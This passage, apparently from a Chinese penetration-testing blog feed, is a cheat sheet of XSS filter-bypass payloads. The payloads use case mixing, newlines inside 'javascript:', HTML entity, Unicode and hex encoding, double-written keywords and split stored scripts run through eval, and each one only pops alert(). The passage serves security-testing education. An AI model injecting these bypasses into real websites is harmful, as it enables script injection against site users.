-<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&lt;SCRipt&gt;alert(</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">1</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)&lt;/scRiPt&gt;</span></span></code></pre>
-<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div></li>
-<li>
-<p>引号‘“</p>
-</li>
-<li>
-<p>空格过滤/绕过</p>
-</li>
-<li>
-<p>回车绕过</p>
-<div class="language-javascript line-numbers-mode" data-highlighter="shiki" data-ext="javascript" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-javascript"><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">a</span><span style="--shiki-light:#986801;--shiki-light-font-style:inherit;--shiki-dark:#D19A66;--shiki-dark-font-style:italic"> href</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"j</span></span>
-<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">a</span></span>
-<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">v</span></span>
-<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">ascript:alert('XSS')"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&gt;回车可用&lt;/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">a</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&gt;</span></span></code></pre>
-<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>事件无法使用</p>
-</li>
-<li>
-<p>编码绕过</p>
-<p>java==&gt;html 16进制<code>&amp;#x006a;&amp;#x0061;&amp;#x0076;&amp;#x0061;</code>​</p>
-<p>script==&gt;html 10进制 <code>&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;</code>​</p>
-<div class="language-javascript line-numbers-mode" data-highlighter="shiki" data-ext="javascript" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-javascript"><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">a</span><span style="--shiki-light:#986801;--shiki-light-font-style:inherit;--shiki-dark:#D19A66;--shiki-dark-font-style:italic"> href</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"</span><span style="--shiki-light:#50A14F;--shiki-dark:#E06C75">&amp;</span><span style="--shiki-light:#986801;--shiki-dark:#E06C75">#x006a</span><span style="--shiki-light:#50A14F;--shiki-dark:#E06C75">;&amp;</span><span style="--shiki-light:#986801;--shiki-dark:#E06C75">#x0061</span><span style="--shiki-light:#50A14F;--shiki-dark:#E06C75">;&amp;</span><span style="--shiki-light:#986801;--shiki-dark:#E06C75">#x0076</span><span style="--shiki-light:#50A14F;--shiki-dark:#E06C75">;&amp;</span><span style="--shiki-light:#986801;--shiki-dark:#E06C75">#x0061</span><span style="--shiki-light:#50A14F;--shiki-dark:#E06C75">;&amp;</span><span style="--shiki-light:#986801;--shiki-dark:#E06C75">#115</span><span style="--shiki-light:#50A14F;--shiki-dark:#E06C75">;&amp;</span><span style="--shiki-light:#986801;--shiki-dark:#E06C75">#99</span><span style="--shiki-light:#50A14F;--shiki-dark:#E06C75">;&amp;</span><span style="--shiki-light:#986801;--shiki-dark:#E06C75">#114</span><span style="--shiki-light:#50A14F;--shiki-dark:#E06C75">;&amp;</span><span style="--shiki-light:#986801;--shiki-dark:#E06C75">#105</span><span style="--shiki-light:#50A14F;--shiki-dark:#E06C75">;&amp;</span><span style="--shiki-light:#986801;--shiki-dark:#E06C75">#112</span><span style="--shiki-light:#50A14F;--shiki-dark:#E06C75">;&amp;</span><span style="--shiki-light:#986801;--shiki-dark:#E06C75">#116</span><span style="--shiki-light:#50A14F;--shiki-dark:#E06C75">;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">:alert('编码可用')"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&gt;编码可用&lt;/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">a</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&gt;</span></span></code></pre>
-<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div></li>
-<li>
-<p>拆分跨站  仅存储型</p>
-<div class="language-javascript line-numbers-mode" data-highlighter="shiki" data-ext="javascript" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-javascript"><span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">//原始payload：</span></span>
-<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">script</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&gt;</span></span>
-<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    a="alert";</span></span>
-<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    a=a+"('使用变量和函数调用alert')";</span></span>
-<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    eval(a);</span></span>
-<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&lt;/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">script</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&gt;</span></span>
-<span class="line"></span>
-<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">//拆分后payload：</span></span>
-<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">script</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&gt;a="alert";&lt;/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">script</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&gt;</span></span>
-<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">script</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&gt;a=a+"('使用变量和函数调用alert')";&lt;/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">script</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&gt;</span></span>
-<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">script</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&gt;eval(a);&lt;/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">script</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&gt;</span></span></code></pre>
-<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li>
-<li>
-<p>双写 leve7</p>
-<p>payload：</p>
-<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">"&gt;&lt;a hrhrefef="</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">javascrscriptipt:alert(</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">'XSS'</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"&gt;111&lt;/a&gt;</span></span></code></pre>
-<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>当字符被过滤可尝试双写绕过</p>
-</li>
-<li>
-<p>10进制编码</p>
-<div class="language-javascript line-numbers-mode" data-highlighter="shiki" data-ext="javascript" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-javascript"><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">script</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&gt;eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))&lt;/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">script</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&gt;</span></span>
-<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">//使用CharCode调用alert,也可以用eval执行</span></span>
-<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">//97,108,101,114,116,40,39,88,83,83,39,41解码后为alert('XSS')</span></span></code></pre>
-<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li>
-<li>
-<p>Unicode编码</p>
-<div class="language-javascript line-numbers-mode" data-highlighter="shiki" data-ext="javascript" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-javascript"><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">script</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&gt;eval('\u0061\u006c\u0065\u0072\u0074\u0028\u0027\u0058\u0053\u0053\u0027\u0029\u003b')&lt;/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">script</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&gt;</span></span>
-<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">//使用Unicode编码调用alert,也可以用eval执行</span></span></code></pre>
-<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div></div></div></li>
-<li>
-<p>16进制编码</p>
-<div class="language-javascript line-numbers-mode" data-highlighter="shiki" data-ext="javascript" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-javascript"><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">script</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&gt;eval("\x61\x6c\x65\x72\x74\x28\x27\x58\x53\x53\x27\x29")&lt;/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">script</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&gt;</span></span></code></pre>
-<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div></li>
-</ol>
-<p>‍</p>
-<p>‍</p>
-<p>‍</p>
-<p>‍</p>
-<p>‍</p>
-<p>‍</p>
-<p>‍</p>
-<p>‍</p>
-<p>‍</p>
-<p>‍</p>
-<p>‍</p>
-<p>‍</p>
-<p>‍</p>
-<p>‍</p>
-<p>‍</p>
-<p>‍</p>
-<p>‍</p>
-<p>‍</p>
-<p>‍</p>
-<p>‍</p>
-<p>‍</p>
-<p>‍</p>
-<p>‍</p>
-<p>‍</p>
-<p>‍</p>
-<p>‍</p>
-<p>‍</p>
-<p>‍</p>
-<p>‍</p>
-<p>‍</p>
-]]></content>
-    <category term="渗透测试"/>
-    <published>2023-02-10T00:00:00.000Z</published>
   </entry>
 </feed>
